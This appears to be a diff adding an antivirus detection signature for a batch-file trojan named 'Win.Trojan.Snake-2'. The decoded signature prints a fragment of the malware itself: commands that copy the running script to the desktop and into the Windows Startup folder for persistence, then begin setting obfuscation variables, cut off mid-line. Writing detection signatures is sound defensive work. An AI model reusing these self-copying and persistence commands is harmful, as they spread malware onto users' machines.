@@ -1,0 +1,10 @@
+VIRUS NAME: Win.Trojan.Snake-2
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+ty nul
+copy %0 %windir%\desktop\*.bat
+copy %0 %windir%\startm~1\progra~1\auotst~1\WSt.bat
+set snake=snake
+set snake=for
+%sna
